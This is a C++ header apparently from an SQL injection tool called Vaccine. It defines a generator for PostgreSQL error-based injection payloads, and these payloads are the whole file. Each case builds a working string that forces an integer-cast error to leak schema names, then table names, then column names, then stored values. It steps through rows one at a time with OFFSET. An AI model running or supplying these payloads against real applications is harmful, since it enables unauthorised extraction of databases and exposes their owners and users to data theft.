#ifndef POSTGRESQL_ERROR_BASED
#define POSTGRESQL_ERROR_BASED

#define ERROR_BASED_INDEX 0
#define ERROR_BASED_MARKED 1
#define ERROR_BASED_DATABASE 2
#define ERROR_BASED_TABLE 3
#define ERROR_BASED_COLUMN 4

#include "../../Vaccine.hpp"

struct postgresql_error_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                const std::string index_str = *config[ERROR_BASED_INDEX];
                int index = std::stoi(index_str);
                *config[ERROR_BASED_INDEX] = std::to_string(index + 1);

                switch (type)
                {
                case DATABASES:
                        return "' OR 1=cast((SELECT '~' || schema_name "
                               "FROM information_schema.schemata "
                               "LIMIT 1 OFFSET " +
                               index_str + ") as integer)-- ";
                case TABLES:
                        return "' OR 1=cast((SELECT '~' || table_name "
                               "FROM information_schema.tables "
                               "WHERE table_schema='" +
                               *config[ERROR_BASED_DATABASE] + "' " +
                               "LIMIT 1 OFFSET " +
                               index_str + ") as integer)-- ";
                case COLUMNS:
                        return "' OR 1=cast((SELECT '~' || column_name "
                               "FROM information_schema.columns "
                               "WHERE table_schema='" +
                               *config[ERROR_BASED_DATABASE] + "' " +
                               "AND table_name='" +
                               *config[ERROR_BASED_TABLE] + "' " +
                               "LIMIT 1 OFFSET " +
                               index_str + ") as integer)-- ";
                case VALUES:
                        return "' OR 1=cast((SELECT '~' || " +
                               *config[ERROR_BASED_COLUMN] + "::text " +
                               "FROM " + *config[ERROR_BASED_DATABASE] + "." +
                               *config[ERROR_BASED_TABLE] + " " +
                               "LIMIT 1 OFFSET " +
                               index_str + ") as integer)-- ";
                default:
                        return std::string();
                }
        };
};
#endif